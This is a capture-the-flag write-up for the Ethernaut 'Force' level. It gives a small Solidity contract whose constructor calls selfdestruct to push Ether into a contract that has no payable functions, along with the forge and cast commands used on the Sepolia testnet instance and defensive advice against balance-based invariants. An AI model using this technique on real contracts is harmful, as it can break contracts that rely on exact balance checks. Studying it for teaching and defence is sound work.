# 07 - Force

## Overview

- **Difficulty:** 5/10
- **Network:** Sepolia Testnet
- **Instance Address:** [`0xc5b7386b3629201ad080bf05d5eeb34724bebb20`](https://sepolia.etherscan.io/address/0xc5b7386b3629201ad080bf05d5eeb34724bebb20)
- **Attack Contract (`ForceCaller`):** [`0x4eb8570e77d3fb7d5e9fec66ad601a72ab7af1d9`](https://sepolia.etherscan.io/address/0x4eb8570e77d3fb7d5e9fec66ad601a72ab7af1d9)
- **Transactions:**
  - **1. Deploy & Exploit (`ForceCaller` with 1 gwei):** [`0x4f6037f4f793cffa6590c5675215d0d30ff9a6543ea29175d3e09bc40e65b043`](https://sepolia.etherscan.io/tx/0x4f6037f4f793cffa6590c5675215d0d30ff9a6543ea29175d3e09bc40e65b043)
  - **2. Level Submission:** [`0x2dbe6ee5896a17805b99d707af0bbc937d24c4d52f7c9d28d452eac0841b1055`](https://sepolia.etherscan.io/tx/0x2dbe6ee5896a17805b99d707af0bbc937d24c4d52f7c9d28d452eac0841b1055)

---

## Objective

Make the balance of the `Force` contract greater than 0.

---

## Contract Analysis

The target contract is [`src/07-force/Force.sol`](./Force.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)
                   */ }
```

The contract is completely empty:
- No `receive()` function.
- No `fallback()` function.
- No `payable` functions.

If any account attempts to send Ether via standard methods (`transfer()`, `send()`, or low-level `call{value: ...}("")`), the transaction automatically reverts because the EVM rejects incoming value to contracts lacking payable handling logic.

---

### Vulnerability Breakdown: Forcible Ether Transfer

In Ethereum, a contract **cannot prevent receiving Ether**. There are three distinct ways to force Ether into any smart contract regardless of its code:

1. **`selfdestruct` Opcode (`0xff`):**
   When a contract executes `selfdestruct(recipient)`, the EVM deletes the calling contract's code and storage, and immediately forwards all remaining Ether to the `recipient` address. This transfer happens at the EVM opcode level without executing any recipient contract code (bypassing `receive()` or `fallback()`). The recipient cannot decline or revert the transfer.
2. **Coinbase / Block Reward:**
   A validator or miner can set the block's `coinbase` address to the contract address, directing transaction priority fees and block rewards directly to it.
3. **Pre-computed Contract Address:**
   Ether can be sent to a contract address *before* the contract is even deployed there (calculated via `keccak256(rlp([deployer, nonce]))`).

---

## Attack Contract

The exploit is implemented in [`src/07-force/ForceCaller.sol`](./ForceCaller.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceCaller {
    constructor(address payable _force) payable {
        selfdestruct(_force);
    }
}
```

### Exploit Architecture: 1-Tx Atomic Execution

1. The constructor is declared `payable`, allowing value to be sent during deployment (`--value 1gwei`).
2. Inside the constructor, `selfdestruct(_force)` is invoked immediately.
3. The contract is created, funds are received, and `selfdestruct` forces the 1 gwei balance into the `Force` instance.
4. Because self-destruction happens within initialization, no runtime bytecode is ever permanently stored on-chain, completing the attack in a single atomic transaction.

```text
[ Player EOA ]
      │
      │ 1. Deploy ForceCaller with --value 1gwei + target = Force
      ▼
[ ForceCaller Constructor ]
      │
      │ 2. selfdestruct(payable(Force))
      ▼
[ Force Contract ]
      └───▶ Balance increased to 1 gwei (1,000,000,000 wei) 💥
```

---

## Step-by-Step Exploit Walkthrough

### 1. Deploy and Exploit in a Single Command

Deploy `ForceCaller`, passing the `Force` instance address as a constructor argument and sending `1 gwei`:

```bash
forge create src/07-force/ForceCaller.sol:ForceCaller \
  --rpc-url sepolia \
  --account <ACCOUNT_NAME> \
  --value 1gwei \
  --broadcast \
  --constructor-args 0xc5b7386b3629201ad080bf05d5eeb34724bebb20
```

- **Deploy & Exploit Tx:** [`0x4f6037f4f793cffa6590c5675215d0d30ff9a6543ea29175d3e09bc40e65b043`](https://sepolia.etherscan.io/tx/0x4f6037f4f793cffa6590c5675215d0d30ff9a6543ea29175d3e09bc40e65b043)
- **Deployed Contract Address:** [`0x4eb8570e77d3fb7d5e9fec66ad601a72ab7af1d9`](https://sepolia.etherscan.io/address/0x4eb8570e77d3fb7d5e9fec66ad601a72ab7af1d9)

### 2. Verify Contract Balance

Check the balance of the `Force` instance:

```bash
cast balance 0xc5b7386b3629201ad080bf05d5eeb34724bebb20 --rpc-url sepolia
# Output: 1000000000 (1 gwei)
```

### 3. Submit Level

Submit the challenge instance on Ethernaut:

- **Submission Tx:** [`0x2dbe6ee5896a17805b99d707af0bbc937d24c4d52f7c9d28d452eac0841b1055`](https://sepolia.etherscan.io/tx/0x2dbe6ee5896a17805b99d707af0bbc937d24c4d52f7c9d28d452eac0841b1055)

---

## Key Security Takeaways

1. **Never Rely on `address(this).balance` for Invariant Checks:**
   Do not write logic that depends on exact balance checks such as:
   ```solidity
   // VULNERABLE: Can be broken by forcible balance injection
   require(address(this).balance == totalDeposits, "Balance mismatch");
   ```
   An attacker can forcefully send Ether via `selfdestruct` and cause this condition to permanently evaluate to `false`, causing a Denial of Service (DoS) or bricking contract operations.
2. **Use Internal Accounting:**
   Always track accounting using dedicated state variables (e.g. `uint256 public totalDeposits`) rather than querying the contract's actual balance directly via `address(this).balance`.
3. **EIP-6780 (Cancun Upgrade) Note:**
   Under EIP-6780 (Ethereum Cancun hard fork), `SELFDESTRUCT` no longer deletes a contract unless it was created in the **same transaction**. However, the forced Ether transfer behavior remains intact, and executing `selfdestruct` inside the constructor (same transaction) still fully deletes the contract and forwards the funds as demonstrated here.
